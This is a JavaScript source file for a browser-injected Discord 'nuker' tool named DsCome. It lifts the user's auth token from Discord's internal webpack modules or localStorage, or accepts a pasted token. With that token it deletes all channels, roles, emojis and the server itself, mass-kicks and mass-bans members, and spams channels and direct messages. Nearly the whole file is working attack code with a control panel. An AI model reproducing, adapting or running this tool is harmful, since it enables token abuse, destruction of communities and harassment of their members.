// DsCome - Nuker
// Full server/channel nuker with token-auth REST calls
(function() {
  if (window.__DSCOME_NUKER_LOADED__) return;
  window.__DSCOME_NUKER_LOADED__ = true;

  var _nukerOpen = false;
  var _activeToken = null;
  var _activeGuildId = null;
  var _activeChannelId = null;

  function getToken() {
    try {
      // try Discord's internal token store
      var token = null;
      Object.keys(window).forEach(function(k) {
        if (k.indexOf('webpackChunk') !== -1) {
          try {
            var chunk = window[k];
            if (chunk && chunk.push) {
              chunk.push([[Math.random()], {}, function(req) {
                Object.keys(req.c).forEach(function(id) {
                  var m = req.c[id] && req.c[id].exports;
                  if (m && m.default && typeof m.default.getToken === 'function') {
                    token = m.default.getToken();
                  }
                });
              }]);
            }
          } catch(ex) {}
        }
      });
      if (token) return token;
      return JSON.parse(localStorage.getItem('token') || 'null');
    } catch(e) { return null; }
  }

  function apiFetch(method, path, body) {
    var token = _activeToken || getToken();
    return fetch('https://discord.com/api/v9' + path, {
      method: method,
      headers: {
        'Authorization': token,
        'Content-Type': 'application/json'
      },
      body: body ? JSON.stringify(body) : undefined
    }).then(function(r) { return r.json().catch(function() { return {}; }); });
  }

  var ops = {
    'Delete All Channels': function(guildId, log) {
      return apiFetch('GET', '/guilds/' + guildId + '/channels').then(function(channels) {
        if (!Array.isArray(channels)) { log('Error: ' + JSON.stringify(channels)); return; }
        log('Deleting ' + channels.length + ' channels...');
        return Promise.all(channels.map(function(ch) {
          return apiFetch('DELETE', '/channels/' + ch.id).then(function() { log('Deleted #' + ch.name); }).catch(function(e) { log('ERR: ' + ch.name); });
        }));
      });
    },
    'Delete All Roles': function(guildId, log) {
      return apiFetch('GET', '/guilds/' + guildId + '/roles').then(function(roles) {
        if (!Array.isArray(roles)) { log('Error'); return; }
        var deletable = roles.filter(function(r) { return r.name !== '@everyone'; });
        log('Deleting ' + deletable.length + ' roles...');
        return Promise.all(deletable.map(function(r) {
          return apiFetch('DELETE', '/guilds/' + guildId + '/roles/' + r.id).then(function() { log('Deleted role: ' + r.name); }).catch(function() { log('ERR role: ' + r.name); });
        }));
      });
    },
    'Spam Channels': function(guildId, log) {
      var promises = [];
      var msg = '☢ DsCome ☢';
      for (var i = 0; i < 20; i++) {
        var name = 'dscome-' + Math.floor(Math.random() * 9999);
        promises.push(apiFetch('POST', '/guilds/' + guildId + '/channels', { name: name, type: 0 })
          .then(function(ch) {
            if (ch && ch.id) return apiFetch('POST', '/channels/' + ch.id + '/messages', { content: msg }).then(function() { log('Spammed: #' + ch.name); });
          }).catch(function() {}));
      }
      return Promise.all(promises);
    },
    'Mass Kick All': function(guildId, log) {
      return apiFetch('GET', '/guilds/' + guildId + '/members?limit=1000').then(function(members) {
        if (!Array.isArray(members)) { log('Error'); return; }
        log('Kicking ' + members.length + ' members...');
        return members.reduce(function(p, m) {
          return p.then(function() {
            return apiFetch('DELETE', '/guilds/' + guildId + '/members/' + m.user.id)
              .then(function() { log('Kicked: ' + m.user.username); }).catch(function() {});
          });
        }, Promise.resolve());
      });
    },
    'Mass Ban All': function(guildId, log) {
      return apiFetch('GET', '/guilds/' + guildId + '/members?limit=1000').then(function(members) {
        if (!Array.isArray(members)) { log('Error'); return; }
        log('Banning ' + members.length + ' members...');
        return members.reduce(function(p, m) {
          return p.then(function() {
            return apiFetch('PUT', '/guilds/' + guildId + '/bans/' + m.user.id)
              .then(function() { log('Banned: ' + m.user.username); }).catch(function() {});
          });
        }, Promise.resolve());
      });
    },
    'Delete All Emojis': function(guildId, log) {
      return apiFetch('GET', '/guilds/' + guildId + '/emojis').then(function(emojis) {
        if (!Array.isArray(emojis)) { log('Error'); return; }
        log('Deleting ' + emojis.length + ' emojis...');
        return Promise.all(emojis.map(function(e) {
          return apiFetch('DELETE', '/guilds/' + guildId + '/emojis/' + e.id).then(function() { log('Del emoji: ' + e.name); }).catch(function() {});
        }));
      });
    },
    'Delete Server': function(guildId, log) {
      log('Deleting server...');
      return apiFetch('DELETE', '/guilds/' + guildId).then(function(r) { log('Done: ' + JSON.stringify(r)); });
    },
    'Spam DMs': function(guildId, log) {
      var recipients = window.prompt('Comma-separated User IDs to DM:');
      if (!recipients) return;
      var ids = recipients.split(',').map(function(s) { return s.trim(); });
      var msg = window.prompt('Message:') || '☢ DsCome ☢';
      return Promise.all(ids.map(function(userId) {
        return apiFetch('POST', '/users/@me/channels', { recipient_id: userId })
          .then(function(dm) { return apiFetch('POST', '/channels/' + dm.id + '/messages', { content: msg }); })
          .then(function() { log('DM sent to ' + userId); }).catch(function() { log('ERR DM: ' + userId); });
      }));
    }
  };

  function buildNukerPanel() {
    var panel = document.createElement('div');
    panel.id = 'dscome-nuker-panel';
    panel.style.cssText = 'position:fixed;top:50%;right:0;transform:translateY(-50%);z-index:99999;background:#1e1f22;border-radius:12px 0 0 12px;padding:16px;width:280px;box-shadow:-4px 0 24px rgba(0,0,0,0.7);color:#dcddde;font-family:sans-serif;max-height:80vh;overflow-y:auto;';

    panel.innerHTML = '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">'
      + '<span style="font-size:16px;font-weight:700;color:#ed4245;">☢ DsCome Nuker</span>'
      + '<button id="dscome-nuker-close" style="background:transparent;border:none;color:#72767d;font-size:18px;cursor:pointer;">✕</button>'
      + '</div>';

    var guildInput = document.createElement('input');
    guildInput.type = 'text';
    guildInput.placeholder = 'Server ID (or blank for current)';
    guildInput.id = 'dscome-nuker-guild';
    guildInput.style.cssText = 'width:100%;box-sizing:border-box;background:#2b2d31;border:1px solid #4e5058;border-radius:6px;padding:7px 9px;color:#dcddde;font-size:12px;outline:none;margin-bottom:8px;';
    panel.appendChild(guildInput);

    var tokenInput = document.createElement('input');
    tokenInput.type = 'password';
    tokenInput.placeholder = 'Token (blank = current session)';
    tokenInput.id = 'dscome-nuker-token';
    tokenInput.style.cssText = guildInput.style.cssText;
    panel.appendChild(tokenInput);

    Object.keys(ops).forEach(function(opName) {
      var btn = document.createElement('button');
      btn.textContent = opName;
      btn.style.cssText = 'width:100%;margin-bottom:6px;background:#2b2d31;color:#dcddde;border:1px solid #4e5058;border-radius:6px;padding:8px;cursor:pointer;font-size:13px;text-align:left;';
      btn.onmouseenter = function() { btn.style.background = '#ed424520'; };
      btn.onmouseleave = function() { btn.style.background = '#2b2d31'; };
      btn.onclick = function() {
        var gId = document.getElementById('dscome-nuker-guild').value.trim() || _activeGuildId;
        var tk = document.getElementById('dscome-nuker-token').value.trim();
        if (tk) _activeToken = tk;
        if (!gId) { log('No guild ID'); return; }
        if (!confirm('Run "' + opName + '" on guild ' + gId + '?')) return;
        ops[opName](gId, log);
      };
      panel.appendChild(btn);
    });

    var logBox = document.createElement('div');
    logBox.id = 'dscome-nuker-log';
    logBox.style.cssText = 'background:#111214;border-radius:6px;padding:8px;margin-top:8px;font-size:11px;color:#57f287;max-height:140px;overflow-y:auto;font-family:monospace;';
    logBox.textContent = 'Ready.';
    panel.appendChild(logBox);

    panel.querySelector('#dscome-nuker-close').onclick = function() { panel.remove(); _nukerOpen = false; };

    return panel;
  }

  function log(msg) {
    var box = document.getElementById('dscome-nuker-log');
    if (box) { box.textContent += '\n' + msg; box.scrollTop = box.scrollHeight; }
  }

  window.__DSCOME_SHOW_NUKER__ = function() {
    if (document.getElementById('dscome-nuker-panel')) return;
    _nukerOpen = true;
    // Try to grab current guild from URL
    var m = location.pathname.match(/channels\/(\d+)\//);
    if (m) _activeGuildId = m[1];
    document.body.appendChild(buildNukerPanel());
  };

  // Floating trigger button
  function injectNukerTrigger() {
    if (document.getElementById('dscome-nuker-trigger')) return;
    var btn = document.createElement('button');
    btn.id = 'dscome-nuker-trigger';
    btn.title = 'DsCome Nuker';
    btn.style.cssText = 'position:fixed;bottom:70px;right:12px;z-index:99990;background:#ed4245;border:none;border-radius:50%;width:36px;height:36px;cursor:pointer;font-size:18px;box-shadow:0 2px 8px rgba(0,0,0,0.5);';
    btn.innerHTML = '☢';
    btn.onclick = function() { window.__DSCOME_SHOW_NUKER__(); };
    document.body.appendChild(btn);
  }

  var _obs = new MutationObserver(injectNukerTrigger);
  _obs.observe(document.documentElement, { childList: true, subtree: true });
  setTimeout(injectNukerTrigger, 1500);
})();
